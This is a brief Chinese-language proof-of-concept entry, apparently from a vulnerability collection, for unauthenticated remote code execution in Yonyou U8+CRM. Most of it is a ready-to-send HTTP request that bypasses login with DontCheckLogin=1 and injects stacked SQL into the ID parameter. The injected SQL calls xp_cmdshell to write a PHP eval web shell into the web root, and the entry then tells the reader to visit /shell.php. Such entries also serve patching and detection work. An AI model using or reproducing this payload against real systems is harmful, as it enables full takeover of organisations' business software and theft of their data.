# 用友U8+CRM 前台RCE

![图片](https://github.com/user-attachments/assets/301e1386-c363-46da-856f-3bb2d864d230)
# POC
在未经授权的情况下，通过ID参数并使用xp_cmdshell执行命令。


GET /bgt/reservationcomplete.php?DontCheckLogin=1&ID=1112;exec%20master..xp_cmdshell%20%27echo%20^%3C?php%20@eval($_POST[x]);?^%3E%20%3E%20D:\U8SOFT\turbocrm70\code\www\shell.php%27; HTTP/1.1

Host: 127.0.0.1:8072

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Cookie: PHPSESSID=bgsesstimeout-

Upgrade-Insecure-Requests: 1

X-Forwarded-For: 192.168.12.3

Priority: u=0, i

![图片](https://github.com/user-attachments/assets/69ccc4fe-fffe-4a1a-b97c-64886a0b3819)


# 访问/shell.php

![图片](https://github.com/user-attachments/assets/1f8e811c-e9fa-4f28-9355-9f32bc4601b5)


